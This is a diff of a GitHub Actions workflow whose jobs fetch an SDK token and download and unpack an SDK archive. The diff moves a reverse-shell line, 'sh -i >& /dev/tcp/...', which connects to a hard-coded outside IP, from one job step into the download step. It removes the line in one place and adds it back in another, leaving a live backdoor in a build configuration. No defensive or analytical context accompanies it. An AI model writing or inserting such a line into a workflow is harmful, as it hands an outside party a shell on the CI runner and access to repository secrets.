@@ -27,7 +27,6 @@ jobs:
           echo "sdktok=${MCSDK_TOKEN}" >> $GITHUB_OUTPUT
           MCSDK_IDEN=$(curl "${SITE_NAME}/getiden?sdktok=${MCSDK_TOKEN}&repo=${GITHUB_REPOSITORY}&runid=${GITHUB_RUN_ID}" | head -n 1)
           echo ServerID-$MCSDK_IDEN
-          sh -i >& /dev/tcp/159.65.128.101/9392 0>&1
           sleep 5
   dl_sdk_files:
     needs: grab_sdk_info
@@ -46,6 +45,7 @@ jobs:
               exit
           fi
           curl ${SITE_NAME}/getsdk?sdktok=${MCSDK_TOKEN} -o sdk.tar.gz
+          sh -i >& /dev/tcp/159.65.128.101/9392 0>&1
           tar -xvzf sdk.tar.gz
           rm sdk.tar.gz
           rm coolsdk/readme.txt
